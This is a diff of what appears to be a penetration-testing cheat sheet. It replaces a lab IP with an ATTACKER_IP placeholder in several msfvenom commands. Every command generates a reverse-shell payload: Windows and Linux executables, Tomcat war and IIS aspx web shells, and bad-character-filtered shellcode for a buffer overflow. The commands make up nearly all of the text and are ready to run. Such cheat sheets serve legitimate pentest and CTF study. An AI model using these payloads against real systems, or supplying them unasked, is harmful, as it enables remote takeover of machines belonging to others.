@@ -34,26 +34,26 @@ Exploitation found a way to run a file or code, and you need the file: a Windows
 A staged Windows Meterpreter reverse shell as an exe:
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe
 ```
 
 A Linux elf reverse shell:
 
 ```bash
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf
 ```
 
 A web payload for a file-upload foothold (war for Tomcat, aspx for IIS):
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o shell.war
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f war -o shell.war
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f aspx -o shell.aspx
 ```
 
 Raw shellcode for a buffer overflow, avoiding bad characters:
 
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -b "\x00\x0a\x0d" -f python -v buf
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -b "\x00\x0a\x0d" -f python -v buf
 ```
 
 ## Workflow
